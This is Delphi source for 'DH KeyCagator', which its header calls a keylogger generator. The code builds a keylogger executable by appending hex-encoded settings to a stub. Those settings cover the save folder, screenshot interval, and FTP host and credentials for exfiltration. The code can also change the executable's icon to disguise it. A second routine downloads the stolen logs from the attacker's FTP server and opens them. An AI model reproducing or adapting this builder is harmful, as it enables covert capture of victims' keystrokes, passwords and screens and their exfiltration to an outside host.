// DH KeyCagator 0.7
// (C) Doddy Hackman 2013
// Keylogger Generator
// Icon Changer based in : "IconChanger" By Chokstyle
// Thanks to Chokstyle

unit genkey;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, sSkinManager, acPNG, ExtCtrls, StdCtrls, sGroupBox, sEdit, sCheckBox,
  sRadioButton, sComboBox, ComCtrls, sStatusBar, sLabel, sButton, sPageControl,
  jpeg, madRes, IdBaseComponent, IdComponent, IdTCPConnection, IdTCPClient,
  IdExplicitTLSClientServerBase, IdFTP, ShellApi;

type
  TForm1 = class(TForm)
    sSkinManager1: TsSkinManager;
    Image1: TImage;
    sStatusBar1: TsStatusBar;
    sGroupBox8: TsGroupBox;
    sButton1: TsButton;
    sPageControl1: TsPageControl;
    sTabSheet1: TsTabSheet;
    sTabSheet2: TsTabSheet;
    sTabSheet3: TsTabSheet;
    sGroupBox1: TsGroupBox;
    sGroupBox2: TsGroupBox;
    sRadioButton1: TsRadioButton;
    sRadioButton2: TsRadioButton;
    sEdit2: TsEdit;
    sComboBox1: TsComboBox;
    sGroupBox3: TsGroupBox;
    sEdit1: TsEdit;
    sGroupBox4: TsGroupBox;
    sLabel1: TsLabel;
    sCheckBox1: TsCheckBox;
    sEdit3: TsEdit;
    sGroupBox7: TsGroupBox;
    sLabel2: TsLabel;
    sCheckBox2: TsCheckBox;
    sEdit4: TsEdit;
    sGroupBox5: TsGroupBox;
    sLabel3: TsLabel;
    sLabel4: TsLabel;
    sLabel5: TsLabel;
    sLabel6: TsLabel;
    sEdit5: TsEdit;
    sEdit6: TsEdit;
    sEdit7: TsEdit;
    sEdit8: TsEdit;
    sTabSheet4: TsTabSheet;
    sTabSheet5: TsTabSheet;
    sGroupBox6: TsGroupBox;
    Image2: TImage;
    sLabel7: TsLabel;
    sGroupBox9: TsGroupBox;
    sGroupBox10: TsGroupBox;
    sLabel8: TsLabel;
    sLabel9: TsLabel;
    sLabel10: TsLabel;
    sLabel11: TsLabel;
    sEdit9: TsEdit;
    sEdit10: TsEdit;
    sEdit11: TsEdit;
    sEdit12: TsEdit;
    sButton2: TsButton;
    IdFTP1: TIdFTP;
    OpenDialog1: TOpenDialog;
    procedure sButton1Click(Sender: TObject);
    procedure sButton2Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}
// Functions

function dhencode(texto, opcion: string): string;
// Thanks to Taqyon
// Based on http://www.vbforums.com/showthread.php?346504-DELPHI-Convert-String-To-Hex
var
  num: integer;
  aca: string;
  cantidad: integer;

begin

  num := 0;
  Result := '';
  aca := '';
  cantidad := 0;

  if (opcion = 'encode') then
  begin
    cantidad := length(texto);
    for num := 1 to cantidad do
    begin
      aca := IntToHex(ord(texto[num]), 2);
      Result := Result + aca;
    end;
  end;

  if (opcion = 'decode') then
  begin
    cantidad := length(texto);
    for num := 1 to cantidad div 2 do
    begin
      aca := Char(StrToInt('$' + Copy(texto, (num - 1) * 2 + 1, 2)));
      Result := Result + aca;
    end;
  end;

end;

//

procedure TForm1.FormCreate(Sender: TObject);
begin
  sSkinManager1.SkinDirectory := ExtractFilePath(Application.ExeName) + 'Data';
  sSkinManager1.SkinName := 'tv-b';
  sSkinManager1.Active := True;
end;

procedure TForm1.sButton1Click(Sender: TObject);
var
  lineafinal: string;

  savein_especial: string;
  savein: string;
  foldername: string;

  capture_op: string;
  capture_seconds: integer;

  ftp_op: string;
  ftp_seconds: integer;
  ftp_host_txt: string;
  ftp_user_txt: string;
  ftp_pass_txt: string;
  ftp_path_txt: string;

  aca: THandle;
  code: Array [0 .. 9999 + 1] of Char;
  nose: DWORD;

  stubgenerado: string;
  op: string;
  change: DWORD;
  valor: string;

begin

  if (sRadioButton1.Checked = True) then

  begin

    savein_especial := '0';

    if (sComboBox1.Items[sComboBox1.ItemIndex] = '') then
    begin
      savein := 'USERPROFILE';
    end
    else
    begin
      savein := sComboBox1.Items[sComboBox1.ItemIndex];
    end;

  end;

  if (sRadioButton2.Checked = True) then
  begin
    savein_especial := '1';
    savein := sEdit2.Text;
  end;

  foldername := sEdit1.Text;

  if (sCheckBox1.Checked = True) then
  begin
    capture_op := '1';
  end
  else
  begin
    capture_op := '0';
  end;

  capture_seconds := StrToInt(sEdit3.Text) * 1000;

  if (sCheckBox2.Checked = True) then
  begin
    ftp_op := '1';
  end
  else
  begin
    ftp_op := '0';
  end;

  ftp_seconds := StrToInt(sEdit4.Text) * 1000;

  ftp_host_txt := sEdit5.Text;
  ftp_user_txt := sEdit7.Text;
  ftp_pass_txt := sEdit8.Text;
  ftp_path_txt := sEdit6.Text;

  lineafinal := '[63686175]' + dhencode
    ('[opsave]' + savein_especial + '[opsave]' + '[save]' + savein + '[save]' +
      '[folder]' + foldername + '[folder]' + '[capture_op]' + capture_op +
      '[capture_op]' + '[capture_seconds]' + IntToStr(capture_seconds)
      + '[capture_seconds]' + '[ftp_op]' + ftp_op + '[ftp_op]' +
      '[ftp_seconds]' + IntToStr(ftp_seconds)
      + '[ftp_seconds]' + '[ftp_host]' + ftp_host_txt + '[ftp_host]' +
      '[ftp_user]' + ftp_user_txt + '[ftp_user]' + '[ftp_pass]' +
      ftp_pass_txt + '[ftp_pass]' + '[ftp_path]' + ftp_path_txt + '[ftp_path]',
    'encode') + '[63686175]';

  aca := INVALID_HANDLE_VALUE;
  nose := 0;

  stubgenerado := 'keycagator_ready.exe';

  DeleteFile(stubgenerado);
  CopyFile(PChar(ExtractFilePath(Application.ExeName)
        + '/' + 'Data/keycagator.exe'), PChar
      (ExtractFilePath(Application.ExeName) + '/' + stubgenerado), True);

  StrCopy(code, PChar(lineafinal));
  aca := CreateFile(PChar('keycagator_ready.exe'), GENERIC_WRITE,
    FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0);
  if (aca <> INVALID_HANDLE_VALUE) then
  begin
    SetFilePointer(aca, 0, nil, FILE_END);
    WriteFile(aca, code, 9999, nose, nil);
    CloseHandle(aca);
  end;

  op := InputBox('Icon Changer', 'Change Icon ?', 'Yes');

  if (op = 'Yes') then
  begin
    OpenDialog1.InitialDir := GetCurrentDir;
    if OpenDialog1.Execute then
    begin

      try
        begin

          valor := IntToStr(128);

          change := BeginUpdateResourceW
            (PWideChar(wideString(ExtractFilePath(Application.ExeName)
                  + '/' + stubgenerado)), False);
          LoadIconGroupResourceW(change, PWideChar(wideString(valor)), 0,
            PWideChar(wideString(OpenDialog1.FileName)));
          EndUpdateResourceW(change, False);
          sStatusBar1.Panels[0].Text := '[+] Done ';
          sStatusBar1.Update;
        end;
      except
        begin
          sStatusBar1.Panels[0].Text := '[-] Error';
          sStatusBar1.Update;
        end;
      end;
    end
    else
    begin
      sStatusBar1.Panels[0].Text := '[+] Done ';
      sStatusBar1.Update;
    end;
  end
  else
  begin
    sStatusBar1.Panels[0].Text := '[+] Done ';
    sStatusBar1.Update;
  end;

end;

procedure TForm1.sButton2Click(Sender: TObject);
var
  i: integer;
  dir: string;
  busqueda: TSearchRec;

begin

  IdFTP1.Host := sEdit9.Text;
  IdFTP1.Username := sEdit11.Text;
  IdFTP1.Password := sEdit12.Text;

  dir := ExtractFilePath(ParamStr(0)) + 'read_ftp\';

  try
    begin
      FindFirst(dir + '\*.*', faAnyFile + faReadOnly, busqueda);
      DeleteFile(dir + '\' + busqueda.Name);
      while FindNext(busqueda) = 0 do
      begin
        DeleteFile(dir + '\' + busqueda.Name);
      end;
      FindClose(busqueda);

      rmdir(dir);
    end;
  except
    //
  end;

  if not(DirectoryExists(dir)) then
  begin
    CreateDir(dir);
  end;

  ChDir(dir);

  try
    begin
      IdFTP1.Connect;
      IdFTP1.ChangeDir(sEdit10.Text);

      IdFTP1.List('*.*', True);

      for i := 0 to IdFTP1.DirectoryListing.Count - 1 do
      begin
        IdFTP1.Get(IdFTP1.DirectoryListing.Items[i].FileName,
          IdFTP1.DirectoryListing.Items[i].FileName, False, False);
      end;

      ShellExecute(0, nil, PChar(dir + 'logs.html'), nil, nil, SW_SHOWNORMAL);

      IdFTP1.Disconnect;
      IdFTP1.Free;
    end;
  except
    //
  end;

end;

end.

// The End ?
